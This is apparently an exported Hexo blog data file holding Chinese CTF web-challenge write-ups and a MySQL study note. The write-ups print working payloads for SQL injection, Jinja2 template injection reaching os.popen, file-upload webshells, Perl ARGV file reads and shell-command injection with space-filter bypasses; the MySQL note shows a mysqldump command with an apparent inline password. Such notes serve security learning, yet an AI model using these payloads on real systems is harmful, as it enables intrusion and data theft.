{"meta":{"title":"MrzBlog","subtitle":"","description":"No way","author":"Zzzy","url":"http://RookieZ996.github.io","root":"/"},"pages":[{"title":"categories","date":"2020-06-19T12:27:22.000Z","updated":"2020-06-19T12:27:37.816Z","comments":false,"path":"categories/index.html","permalink":"http://rookiez996.github.io/categories/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"tags","date":"2020-06-19T12:26:24.000Z","updated":"2020-06-19T12:27:12.433Z","comments":false,"path":"tags/index.html","permalink":"http://rookiez996.github.io/tags/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"},{"title":"about","date":"2020-06-19T12:27:49.000Z","updated":"2020-06-19T12:27:59.704Z","comments":true,"path":"about/index.html","permalink":"http://rookiez996.github.io/about/index.html","excerpt":"","text":"document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });"}],"posts":[{"title":"upload-labs文件上传漏洞1-20关","slug":"upload-labs文件上传漏洞1-20关","date":"2020-07-27T00:07:22.439Z","updated":"2020-07-27T00:09:51.254Z","comments":true,"path":"2020/07/27/upload-labs文件上传漏洞1-20关/","link":"","permalink":"http://rookiez996.github.io/2020/07/27/upload-labs%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E1-20%E5%85%B3/","excerpt":"","text":"upload-labs文件上传漏洞1-20关白名单Pass-01js脚本检查白名单，直接上传一句话木马，先将后缀改为jpg，后抓包改会php即可。 image-20200727080203035 Pass-02 image-20200727080450288 检查文件类型，抓包修改Content-Type即可。 image-20200727080424824 黑名单","categories":[],"tags":[]},{"title":"极客大挑战2019_LoveSQL","slug":"极客大挑战2019_LoveSQL","date":"2020-06-20T07:45:54.560Z","updated":"2020-06-20T07:51:59.312Z","comments":true,"path":"2020/06/20/极客大挑战2019_LoveSQL/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019_LoveSQL/","excerpt":"","text":"[极客大挑战 2019]LoveSQL1.尝试构造?username=1’&amp;password=12，得到报错，是密码报错，尝试在密码上构造?username=1&amp;password=12’ image-20200620154609257 2.得到报错’‘ 12‘ ’‘,可知密码是字符型，如果是整形，报错信息应为“ ’ ” 3.报错得知，我们需要闭合这个sql语句，用注释即可。 4.尝试找到回显，构造?username=1&amp;password=12’ union select 1%23，得到提示信息 image-20200620154621025 5.可知构造的列数不够，尝试确认有三个列，构造?username=1&amp;password=12’ union select 1,2,3%23 发现后两列会显示。之后就是常规操作，information_schema爆表名，列名…… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"FlatScience&Cat","slug":"FlatScience&Cat","date":"2020-06-20T07:45:17.003Z","updated":"2020-06-20T07:46:33.043Z","comments":true,"path":"2020/06/20/FlatScience&Cat/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/FlatScience&Cat/","excerpt":"","text":"FlatSciencetip1.sqlite自带结构表sqlite_master，sql是表中的一个字段，注入时经常用到sql字段。 2.利用orderby报错探知表中字段数 image-20200620154541348 3.sqlite_master表定义如下 CREATE TABLE sqlite_master ( type TEXT， name TEXT, tbl_name TEXT, rootpage INTEGER, sql TEXT ); 对表而言，type字段值为table,name为表的名字 https://blog.csdn.net/zz_Caleb/article/details/89323133?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase Cat1.传入一个url编码不支持的参数导致报错，通过报错获得信息，的知识django框架。 2.找到settings文件 3.找到数据库文件，得到flag tip1.django项目下一般有个settings.py文件是设置网站数据库路径（django默认使用的的是sqlites数据库） 2.django项目生成时settings.py会存放在以项目目录下再以项目名称命名的文件夹下面 https://blog.csdn.net/diemaoye6838/article/details/101984761?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158926838319726869033920%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.57693%2522%257D&amp;request_id=158926838319726869033920&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-1-101984761.nonecase&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCat document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"fakebook&ics-05","slug":"fakebook&ics-05","date":"2020-06-20T07:44:54.508Z","updated":"2020-06-20T07:46:33.075Z","comments":true,"path":"2020/06/20/fakebook&ics-05/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/fakebook&ics-05/","excerpt":"","text":"fakebook1.尝试性访问robots.txt发现源码泄露，御剑可以扫出flag.php 2.发现会通过curl发起网络请求获得blog内容并且显示出来 因为curl_exec()使用不当造成SSRF(服务器端请求伪造) 3.发现union被过滤，尝试使用/**/绕过 image-20200620154501237 4.根据提示信息，知道网站绝对路径，以及数据库中的数据是反序列化存储 5.根据4得到的路径访问/var/www/html/flag.php 6.curl支持file协议，构造反序列化内容 ics-051.利用php://filter/read=convert.base64-encode/resource=index.php读取源码 2.发现preg_replace函数执行漏洞，直接查询flag文件 tip：burp中如果要进行system函数调用空格用”+“代替 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Web_php_include&NewsCenter&NaNNaNNaNNaN-Batman&PHP2","slug":"Web_php_include&NewsCenter&NaNNaNNaNNaN-Batman&PHP2","date":"2020-06-20T07:41:43.096Z","updated":"2020-06-20T07:46:33.035Z","comments":true,"path":"2020/06/20/Web_php_include&NewsCenter&NaNNaNNaNNaN-Batman&PHP2/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/Web_php_include&NewsCenter&NaNNaNNaNNaN-Batman&PHP2/","excerpt":"","text":"[TOC] Web_php_include思路11.strstr()函数对大小写敏感，利用大写PHP绕过过滤 php://input不是很了解，但是题目基本能做 思路2后台扫描发现phpmyadmin 进入后查看secure_file_priv为空，说明可以写入一句话 image-20200620154256172 利用sql语句植入webshell NewsCenter思路11.进入页面后只有一个输入框，考虑xss或者sql注入 2.利用burp抓包后保存txt文件，再利用sqlmap进行自动注入。 3.发现news数据库，直接dump数据，得到flag NaNNaNNaNNaN-Batman思路11.注意到“_”是一个变量名，将eval改为alert，能将乱码的代码显示出来。 2.代码审计soeasy。满足16位长度，以及正则匹配。payload：be0f233ac7be98aa 思路2直接将if语句里面的代码拿到console中执行即可。 PHP2思路1 “.phps“后缀第一次见，长记性。 传递参数id时，浏览器会对非ascii码的字符进行url编码，在代码运行时，会自动进行一次url解码。然后代码中又进行了一次解码。所以一共是两次解码。我们对”a“进行两次编码绕过。 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Web_php_unserialize&supersqli&easy_tornado","slug":"Web_php_unserialize&supersqli&easy_tornado","date":"2020-06-20T07:40:29.045Z","updated":"2020-06-20T07:40:41.202Z","comments":true,"path":"2020/06/20/Web_php_unserialize&supersqli&easy_tornado/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/Web_php_unserialize&supersqli&easy_tornado/","excerpt":"","text":"Web_php_unserialize审计+绕过 绕过点1.正则表达式，将数字前加上“+” 绕过点2.wakeup函数，将序列化后的属性个数改成一个大于实际属性个数的值 supersqli12345678--1(骚方法)?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;-- +--2(加id)inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int;--+--3改（id）?inject=1';rename tables `words` to `words1`;rename tables `1919810931114514` to `words`;alter table `words` change `flag` `id` varchar(255);--+ easytornado模板注入 1.进入hints.txt得到filehash的构造形式，md5(cookie_secret+md5(filename)) 2.来到flag.txt得到flag的路径，即图中的filename，现在只需得到cookie_secret 3.不构造filehash直接访问/fllllllllllllag,发现url中有get传参msg，可能存在注入。 4.查询得知cookie_secret在handler.settings中，传参?msg=得到cookie_setting 5.按照filehash的形式构造哈希传入即可得到flag handler类，它代表着业务逻辑，我们进行服务端开发时就是编写一堆一堆的handler用来服务客户端请求。路由表，它将指定的url规则和handler挂接起来，形成一个路由映射表。当请求到来时，根据请求的访问url查询路由映射表来找到相应的业务handler。 handler 指向RequestHandler而RequestHandler.settings又指向self.application.settings所有handler.settings就指向RequestHandler.application.settings了！ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"Web_php_include&ics-06","slug":"Web_php_include&ics-06","date":"2020-06-20T07:40:29.044Z","updated":"2020-06-20T07:40:41.209Z","comments":true,"path":"2020/06/20/Web_php_include&ics-06/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/Web_php_include&ics-06/","excerpt":"","text":"1.thinkphp 5.0.20 rce命令执行漏洞 2.怎么利用webshell，怎么植入一个webshell Web_php_include1.strstr()函数对大小写敏感，利用大写PHP绕过过滤 php://input不是很了解，但是题目基本能做 ics-06观察到url中有id，进行爆破即可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"unserialize3&upload1&Web_python_template_injection","slug":"unserialize3&upload1&Web_python_template_injection","date":"2020-06-20T07:40:29.042Z","updated":"2020-06-20T07:40:41.234Z","comments":true,"path":"2020/06/20/unserialize3&upload1&Web_python_template_injection/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/unserialize3&upload1&Web_python_template_injection/","excerpt":"","text":"unserialize3wakeup函数在反序列化之前调用。 如果序列化后声明的的属性个数大于实际的属性个数，就可绕过wakeup函数。 upload1审计源码发现只支持jpg或png后缀 编辑一句话代码，虚晃一枪将后缀改为jpg 上传时抓包，更改回php后缀，木马植入成功。 Web_python_template_injection题目提示python模板注入 1.首先尝试url/49回显49 说明存在注入 2.接着找到os 2.1找到str类 1http://124.126.19.106:30931/{{' '.__class__}} 2.2找到str类的父类object 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2]}} 2.3找object类中的引用列表 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()}} 2.4找到处于下标71的os的所在类site._Painter 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71]}} 2.5找到os 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}} 2.6执行命令为所欲为 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}} 2.7得到flag 1http://124.126.19.106:30931/{{' '.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}} document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"shrine&lottery&mfw","slug":"shrine&lottery&mfw","date":"2020-06-20T07:40:29.039Z","updated":"2020-06-20T07:40:41.243Z","comments":true,"path":"2020/06/20/shrine&lottery&mfw/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/shrine&lottery&mfw/","excerpt":"","text":"shrine1.进入网站看到一段python代码 12345678910111213141516171819202122import flaskimport osapp = flask.Flask(__name__)app.config['FLAG'] = os.environ.pop('FLAG') @ app.route('/')def index(): return open(__file__).read() @ app.route('/shrine/')def shrine(shrine): def safe_jinja(s): #过滤括号 s = s.replace('(', '').replace(')', '') blacklist = ['config', 'self'] #过滤config 和self return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s return flask.render_template_string(safe_jinja(shrine))if __name__ == '__main__': app.run(debug=True) 2.不了解框架，直接上网搜payload： 1{{get_flashed_messages.__globals__['current_app'].config['FLAG']}} 2.lottery1.发现robots.txt中泄露了.git 2.利用githack下载源码 3.在api.php中发现了猜数字的代码，存在弱类型“==”漏洞。传入参数[true,true…..]即可得到钱。 3.mfw1.网页提示git，怀疑存在git泄露 2.利用githack下载源码，发现flag.php但是并没有内容 3.继续看index.php发现存在命令执行漏洞。构造page=abc’) or system(“cat templates/flag.php”);//传入即可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"EasySQL","slug":"EasySQL","date":"2020-06-20T07:40:29.035Z","updated":"2020-06-20T07:40:41.193Z","comments":true,"path":"2020/06/20/EasySQL/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/EasySQL/","excerpt":"","text":"[SUCTF 2019]EasySQL1.发现只有输入“非0数字”会有回显。猜测sql语句可能存在“||”。猜测sql语句为 1\"select\".post['query'].\"||flag from Flag\"; 解法1.构造payload：”*,1”进行查询，则执行的sql语句为 1select *,1||flag from Flag; 2.构造payload：”1;set sql_mode=pipes_as_concat;select 1”进行查询，则执行的sql语句为 1select 1;set_sql_mode=pipes_as_concat;select 1||flag from Flag; sql_mode=pipes_as_concat可以将||的作用由or变为字符串拼接 [极客大挑战 2019]EasySQL万能密码登陆即可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"bug&i-got-id-200","slug":"bug&i-got-id-200","date":"2020-06-20T07:40:29.033Z","updated":"2020-06-20T07:40:41.254Z","comments":true,"path":"2020/06/20/bug&i-got-id-200/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/bug&i-got-id-200/","excerpt":"","text":"bug步骤1.创建账号登陆后发现manage选项只有管理员能点 2.尝试更改用户名为admin，使用找回密码，抓包将用户名修改为admin 3.用admin登陆查看manage发现IP不对，更改XFF头127.0.0.1 4.成功进入manage功能，发现没什么功能。查看源码发现可以传get参数 5.do参数未知，需要我们尝试，尝试include,upload，发现是upload 9.尝试植入php一句话木马，失败，有检测。 10.尝试改后缀为php5，还是不行。 11.用js代码绕过，后缀继续用php5，得到flag 1&lt;script language=\"php\"&gt;system(\"ls\");&lt;/script&gt; tip1.抓包修改用户名 2.改php后缀为php5 3.利用js代码修改language参数执行php代码 i-got-id-200知识背景Perl语言（CGI模块）1.upload函数用于处理文件上传。函数参数为html代码input标签中的name2.param函数用于获取上传的文件。函数参数同upload3.Perl使用文件句柄类型的变量来操作文件（包括向文件中读写数据）需要使用“&lt;&gt;”运算符，括号内如果是文件句柄，则会读取文件句柄 4.输出文件内容这里要用到$_变量 $_是默认参数，在没有指定值得情况下，默认处理上一个变量。 如：读取文件每一行 while ( &lt;$file&gt; ) { print \"$_\"; } 解题1.新增一个文件上传，删掉文件名。将文件内容改成”ARGV”，此时$file的值变成了ARGV，ARGV会将@ARGV数组的每一项作为文件名并读取。2.控制@ARGV数组，只需在url后添加路径即可。此时就能实现任意文件读取3.可直接通过读取flag文件获得flag，但是通常需要查找查找语句 1.url+“/bin/bash%20-c%20ls$IFS/|” 2.url+“/bin/bash%20-c%20cat${IFS}/flag|” https://www.guildhab.top/?p=867 https://blog.csdn.net/qq_41617034/article/details/105518914?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.nonecase document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"[RoarCTF 2019]Easy Calc","slug":"[RoarCTF 2019]Easy Calc","date":"2020-06-20T07:40:29.029Z","updated":"2020-06-20T07:40:41.217Z","comments":true,"path":"2020/06/20/[RoarCTF 2019]Easy Calc/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/[RoarCTF%202019]Easy%20Calc/","excerpt":"","text":"[RoarCTF 2019]Easy Calc1.绕过waf，waf不允许num传字母。于是在参数名num前面加空格。waf在检查时找不到num变量，而php解析时会先把空格去掉。 2.查看目录下所有文件，但“/”被过滤，用chr(47)绕过 3.同样的方式将flag所在文件名用chr()形式传入即可 [HCTF 2018]adminFlask session欺骗 https://blog.csdn.net/weixin_44677409/article/details/100733581?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522158995821619195239859108%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=158995821619195239859108&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v2~pc_rank_v3-1-100733581.first_rank_ecpm_v2_pc_rank_v3&amp;utm_term=%5BHCTF+2018%5Dadmin document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"[GXYCTF2019]Ping Ping Ping","slug":"[GXYCTF2019]Ping Ping Ping","date":"2020-06-20T07:40:29.027Z","updated":"2020-06-20T07:40:41.224Z","comments":true,"path":"2020/06/20/[GXYCTF2019]Ping Ping Ping/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/[GXYCTF2019]Ping%20Ping%20Ping/","excerpt":"","text":"[GXYCTF2019]Ping Ping Pingtip1.“$IFS$1” 或“${IFS}$”可替代空格 2.可以将过滤的字符经过base64编码后传入 3.利用反引号将反引号内的命令的输出作为输入执行 4.创建变量构造payload: ?ip=127.0.0.1;x=g;cat$IFS$1fla$x.php document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"jother编码","slug":"jother编码","date":"2020-06-20T07:28:25.969Z","updated":"2020-06-20T07:34:38.837Z","comments":true,"path":"2020/06/20/jother编码/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/jother%E7%BC%96%E7%A0%81/","excerpt":"","text":"alert([function(){alert(1);}()]) 这个例子说明alert里面是可以执行函数的 alert([])弹窗 说明[]是一个最简单的匿名函数 +[] 加号强制将[]函数返回值void转化为数值，结果为0 ![] !强制将void转化为false !![] 同理，这个为true，+!![]为1 那么就可以得到1-9的数字了 {}+[] 可以得到字符串“[object Object]” 又丰富了一个字符”o” 现在可以构造如下形式执行js的任意代码 image-20200620152839043 附：md5(‘0e215962017’)==’0e291242476940776845150308577824’ 参考博客：https://blog.csdn.net/weixin_33755554/article/details/87981545?utm_medium=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"0503命令执行漏洞","slug":"0503命令执行漏洞","date":"2020-06-20T07:26:06.423Z","updated":"2020-06-20T07:29:40.926Z","comments":true,"path":"2020/06/20/0503命令执行漏洞/","link":"","permalink":"http://rookiez996.github.io/2020/06/20/0503%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"命令执行漏洞 A&amp;&amp;B表示A执行成功，才能执行B A&amp;B是简单拼接，没有制约关系 A|B表示A的输出作为B的输入执行 A||B表示A执行失败才执行B A;B表示先执行A在执行B document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]},{"title":"mysql知识点","slug":"mysql知识点","date":"2020-06-19T12:43:55.688Z","updated":"2020-06-19T13:04:56.141Z","comments":true,"path":"2020/06/19/mysql知识点/","link":"","permalink":"http://rookiez996.github.io/2020/06/19/mysql%E7%9F%A5%E8%AF%86%E7%82%B9/","excerpt":"","text":"[TOC] Sql知识点去重统计岗位数量 连接查询找出每个员工的部门名字和上级领导以及薪资等级，在一张表中呈现 嵌套子查询找出每个部门平均薪资的等级 image-20200424195818187 找出每个部门平均的薪资等级 image-20200424195846234 Limit的使用（mysql特有的）取出工资前五名 limit 第一个参数是起始位置，从0开始记，第二个参数表示长度 image-20200424200318318 tip：limit是sql语句中最后执行的环节 表的复制复制一张dept表，叫做dept1 将查询结果插入表中将dept表中的数据插入到dept1中 修改数据修改dept1编号为10的部门名为renshibu，地点为上海 删除数据删除10部门数据 删除大表数据。表被截断，不可回滚，一去不复返 约束非空约束：创建一个员工表，姓名不得为空 唯一性约束： 列级约束1234567891011drop table if exists t_user;create table t_user(id int,username varchar(255) unique);insert into t_user values(1,\"zhangsan\");insert into t_user values(2,\"zhangsan\");//错误 用户名重复insert into t_user(id) values(2);insert into t_user(id) values(3);//正确执行，同为null不认为是重复 表级约束123456789drop table if exists t_user;create table t_user(id int,username varchar(255),unique(id,username)--表示联合约束“id”与“username”拼接不能相同);insert into t_user values(1,\"zhangsan\");insert into t_user values(2,\"zhangsan\");insert into t_user values(1,\"zhangsan\"); --错误 重复 主键约束 主键字段不得为空也不得重复 1234567891011drop table if exists t_user;create table t_user(no int primary key,name varchar(255));insert into t_user values(1,'zhangsan');insert into t_user values(2,'lisi');insert into t_user values(3,'wangwu');insert into t_user values(1,'wangwu');--错误，主键重复insert into t_user (name) values('wangwu');--错误，主键不能为空 主键字段自增auto_increment 123456789drop table if exists t_user;create table t_user(no int primary key auto_increment,name varchar(255));insert into t_user(name) values('wangwu');insert into t_user(name) values('lisi');insert into t_user(name) values('zhangsan');select * from t_user; 外键约束 1234567891011121314151617181920212223242526272829drop table if exists t_student;drop table if exists t_class;create table t_class(cno int,classname varchar(255),primary key(cno));create table t_student(sno int,sname varchar(255),classno int,primary key(sno),foreign key(classno) references t_class(cno));insert into t_class values(101,'xxxxxxxxxxxx');insert into t_class values(102,'yyyyyyyyyyyy');insert into t_student values(1,'zs1',101);insert into t_student values(2,'zs2',101);insert into t_student values(3,'zs3',102);insert into t_student values(4,'zs4',102);insert into t_student values(5,'zs5',102);insert into t_student values(6,'zs6',103);--执行失败，外键约束select * from t_class;select * from t_student; Mysql中的存储引擎查看当前mysql支持的存储引擎 show engines \\G MyISAM 采用三个文件组织一张表 1.xxx.FRM 存储表结构（格式） 2.xxx.MYD 存储表中数据 3.xxx.MYI 存储表中的索引 优点：可被压缩，节省存储空间。可以转化为只读表，提高检索效率 缺点：不支持事务。 InnoDB xxx.FRM存储表结构 数据存储在tablespace中，这是一个逻辑概念。无法被压缩，无法转化为只读。 InnoDB支持级联删除和级联更新。（父信息和子信息联动删除和更改） 优点：支持事务、行级锁、外键。存储数据安全 Memory 查询速度最快，但是表存储在内存中，关机就没。 事务事务只与DML语句挂钩，即insert,delete,updata语句 四大特性ACID 1.Atomicity：原子性：事务是最小的工作单元，不可再分。 2.Consistency：一致性：事务必须保证多条DML语句同时成功或失败 3.Isolation：隔离性：事务A与事务B之间具有隔离 4.Durability：持久性：最终数据必须持久化到硬盘中，事务才算成功结束。 image-20200430142457042 Demo对比commit和rollback12345678910111213141516171819drop table if exists t_user;create table t_user(id int primary key auto_increment,name varchar(255));insert into t_user(name) values('zhangsan');start transaction;insert into t_user(name) values('lisi');insert into t_user(name) values('wangwu');rollback;select * from t_user; insert into t_user(name) values('zhangsan');start transaction;insert into t_user(name) values('lisi');insert into t_user(name) values('wangwu');commit;select * from t_user; Demo尝试四种隔离级别(此处不给例子)设置事务隔离级别 1set global transaction ioslation level read committed; 查看事务隔离级别 1select @@global.tx_isolation; 索引添加条件 1.数据量庞大 2.该字段很少进行DML操作（一旦进行DML操作，索引需要维护，成本很高） 3.该字段需要经常被查询 注意：主键和unique约束的字段自动添加索引 tip：查看sql语句的执行原理 1explain select ename,sal from emp where ename='smith'; 索引语法 创建索引 create index 索引名 on 表名(字段名) 1create index emp_sal_index on emp(sal); 删除索引 drop index 索引名 on 表名 1drop index emp_sal_index on emp; 实现原理 image-20200503114054028 视图创建视图 1create view myview as select empno,ename from emp; 对视图进行crud会影响原表中的数据 数据备份数据库导出（在dos命令窗口执行 不需要登陆mysql） 1mysqldump bjpowernode&gt;D:\\ls\\数挖 -uroot -p7ag-z6(s; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","categories":[],"tags":[]}],"categories":[],"tags":[]}